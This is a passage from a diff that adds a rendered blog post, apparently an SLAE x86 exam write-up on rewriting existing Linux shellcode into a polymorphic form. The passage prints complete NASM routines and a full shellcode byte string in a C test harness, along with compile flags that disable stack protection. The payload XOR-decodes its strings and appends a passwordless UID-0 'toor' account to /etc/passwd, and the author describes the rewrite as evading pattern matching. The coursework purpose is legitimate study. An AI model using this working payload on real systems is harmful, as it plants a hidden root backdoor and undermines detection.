+    <span class="nf">mul</span> <span class="nb">ecx</span>
+
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">11</span>
+    
+    <span class="c1">; ...</span>
+
+</code></pre></div></div>
+<p><sub class='aside'>The assembly code in between has been omitted for clarity, in order to show the <code>JMP-CALL-POP</code> technique
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; ...</span>
+
+<span class="nl">CallRunShellcode:</span>
+
+    <span class="nf">call</span> <span class="nv">RunShellcode</span>
+    <span class="nl">EncodedStringBytes:</span> <span class="kd">db</span> <span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x75</span>
+</code></pre></div></div>
+<p>Compared to the original shellcode, I'm still using the the <code>JMP-CALL-POP</code> technique. I decided against pushing all the bytes 4 DWORDS at a time, as that would require way more bytes (considering the XOR operations too).</p>
+<p>I'm saving the pointer to the bytes referenced by <code>EncodedStringBytes</code> into the register <code>EDI</code> instead of <code>ESI</code>, in order to change the resulting bytes.</p>
+<p>However, I had to use the register <code>ESI</code> too, because I would later use <code>EDX</code> for decoding the XOR-ed bytes.</p>
+<p>The other instructions (<code>xor</code>, <code>mul</code>, and <code>mov</code>) weren't present in the original shellcode, but I needed them for the decoding stub.</p>
+<p>Follows the next routine:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">DecodeStringBytes:</span>
+    
+    <span class="c1">; XOR key: uccq</span>
+    <span class="nf">xor</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="mh">0x75636371</span>
+
+    <span class="c1">; now that the 4 bytes are decoded, step to the next 4 bytes</span>
+    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mh">0x4</span>
+
+    <span class="c1">; repeat 11 times, if ECX == 0 don't loop</span>
+    <span class="nf">loop</span> <span class="nv">DecodeStringBytes</span>
+</code></pre></div></div>
+<p>The goal of the code above is to decode the encoded bytes, by XOR-ing one DWORD at a time with the key <code>0x75636371</code>. It doesn't hold any special meaning, it's just 4 random bytes that don't generate any NULL bytes during the XOR operations.</p>
+<p>The <code>loop</code> instruction, used in conjunction with <code>mov cl, 11</code> from above, allow the shellcode to repeat the routine <code>DecodeStringBytes</code> 11 times, in order to decode the <code>44 encoded bytes</code> referenced by the variable <code>EncodedStringBytes</code>.</p>
+<p>Follows the next routine, <code>OpenFile</code>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">OpenFile:</span>
+
+    <span class="c1">; restore EDI to the original value</span>
+    <span class="c1">;   (pointing to the start of the decoded bytes)</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esi</span>
+
+    <span class="c1">; store the pointer to 'toor::0:0:t00r:/root:/bin/bash\0x0a' into ebx</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>
+    <span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0xc</span>
+
+    <span class="c1">; save the same pointer into ESI too</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">pop</span> <span class="nb">esi</span>
+
+    <span class="c1">; store the pointer to '/etc/passwd' into EBX</span>
+    <span class="nf">push</span> <span class="nb">edi</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+
+    <span class="c1">; store 0x5 into EAX (syscall: open())</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x6</span>
+    <span class="nf">dec</span> <span class="nb">eax</span>
+
+    <span class="c1">; store the WORD 0x1a4 into EDX</span>
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x69</span>
+    <span class="nf">rol</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>
+
+    <span class="c1">; store the WORD 0x442 into ECX</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0x443</span>
+    <span class="nf">dec</span> <span class="nb">ecx</span>
+
+    <span class="c1">; call syscall 0x5: open()</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>The first instructions are used by the shellcode for retrieving the pointers to the following decoded strings:</p>
+<ol>
+<li>stored into the registers <code>EBX</code> and <code>EDI</code>: <code>/etc/passwd</code></li>
+<li>stored into the register <code>ESI</code>: <code>toor::0:0:t00r:/root:/bin/bash</code> (plus <code>0xa</code> at the end)</li>
+</ol>
+<p>Compared to the original shellcode, I tried to restrict myself from directly moving bytes into registers, but instead using the <code>PUSH-POP</code> technique, as it requires the same number of bytes from what I've seen so far.</p>
+<p>Moreover, I didn't want to use hard-coded values (<code>0x1a4</code> and <code>0x442</code>), so I simply used <code>DEC</code> and <code>ROL</code> to calculate the original values.</p>
+<p>Next, there's the routing <code>AddMaliciousUser</code>, which appends the string <code>toor::0:0:t00r:/root:/bin/bash</code> to the previously-opened file, i.e. <code>/etc/passwd</code>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">AddMaliciousUser:</span>
+
+    <span class="c1">; exchange EBX with EAX in order to save the</span>
+    <span class="c1">;   file descriptor of the file opened</span>
+    <span class="nf">xchg</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">eax</span>
+
+    <span class="c1">; clear EAX for later use</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+    <span class="nf">pop</span> <span class="nb">edx</span>
+
+    <span class="c1">; save the DWORD 0x0000001f into EDX</span>
+    <span class="nf">push</span> <span class="mh">0x20</span>
+    <span class="nf">pop</span> <span class="nb">edx</span>
+    <span class="nf">dec</span> <span class="nb">edx</span>
+
+    <span class="c1">; save the DWORD 0x00000004 into EAX</span>
+    <span class="nf">push</span> <span class="mh">0x3</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+
+    <span class="c1">; get the pointer to `toor::0:0:t00r:/root:/bin/bash`</span>
+    <span class="c1">;   and save it into ECX</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">pop</span> <span class="nb">ecx</span>
+
+    <span class="c1">; call syscall write()</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>Starting from the top, instead of using <code>mov ebx, eax</code> I chose to use an instruction I've rarely used up until now: <code>XCHG</code>, which exchanges the contents of the two registers.</p>
+<p>Next, I've used the instruction <code>XOR</code>, <code>PUSH</code>, and <code>POP</code> in order to clear <code>EDX</code> and <code>EAX</code>.</p>
+<p>Compared to the original shellcode, which simply clears <code>EDX</code> by means of the instruction <code>xor edx, edx</code>, mine clears <code>EAX</code> too, in order to avoid errors caused by the return value of <code>open()</code>.</p>
+<p>Moreover, to make the shellcode more polymorphic and evade pattern matching, I used the <code>PUSH-POP</code> technique to set the desired values into the registers.</p>
+<p>Below is the second-to-last Assembly routine:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">CloseFileHandle:</span>
+
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+
+    <span class="c1">; call syscall close()</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x6</span>
+    <span class="nf">int</span> <span class="mh">0x8</span>
+</code></pre></div></div>
+<p>It closes the file descriptor of the file <code>/etc/passwd</code>, opened before by means of the syscall <code>open()</code>. As before, I've explicitly cleared the <code>EAX</code> register in order to make the shellcode more stable. The rest is the same as the original shellcode.</p>
+<p>Finally, the last routine:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Exit:</span>
+
+    <span class="c1">; call syscall exit() </span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>It terminates the execution. I chose not to clear <code>EAX</code> in order to save more bytes, but since this polymorphic version is simply <code>115%</code> bigger than the original size, you can just add a <code>xor eax, eax</code> before the <code>inc eax</code>, since it required only <code>1 byte</code>.</p>
+<h3 id="testing">Testing</h3>
+<p>To test the polymorphic shellcode, I've used the following C program:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>To compile:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-o</span> test_polymorphic_shellcode test_polymorphic_shellcode.c
+</code></pre></div></div>
+<p>Once I've run it, I could see a new entry inside the file <code>/etc/passwd</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~/exam/assignment_6/2<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-n</span> 3 /etc/passwd
+<span class="c"># landscape:x:104:109::/var/lib/landscape:/bin/false</span>
+<span class="c"># sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span>
+<span class="c"># rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash</span>
+
+rbct@slae:~/exam/assignment_6/2<span class="nv">$ </span><span class="nb">sudo</span> ./shellcode_template 
+<span class="c"># Shellcode length: 123</span>
+
+rbct@slae:~/exam/assignment_6/2<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-n</span> 3 /etc/passwd
+<span class="c"># sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span>
+<span class="c"># rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash</span>
+<span class="c"># toor::0:0:t00r:/root:/bin/bash</span>
+
+rbct@slae:~/exam/assignment_6/2<span class="nv">$ </span>
+</code></pre></div></div>
+
+
+            <footer class="tags">
+                <section class="mono tags">
+                    Tagged
+
+                    
+                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/x86/">x86</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/polymorphism/">polymorphism</a>
+                </section><section class="pagination">
+                        <a href="/22/01/04/slae32-assignment-6_3">
+                            <div class="mono">NEXT</div>
+                            SLAE x86 Exam - Assignment #6 Part 3
+                        </a>
+                    </section><section class="pagination">
+                        <a href="/22/01/04/slae32-assignment-6_1">
+                            <div class="mono">PREVIOUS</div>
+                            SLAE x86 Exam - Assignment #6 Part 1
+                        </a>
+                    </section></footer>
+        </main>
+    </article>
+  </body>
+</html>
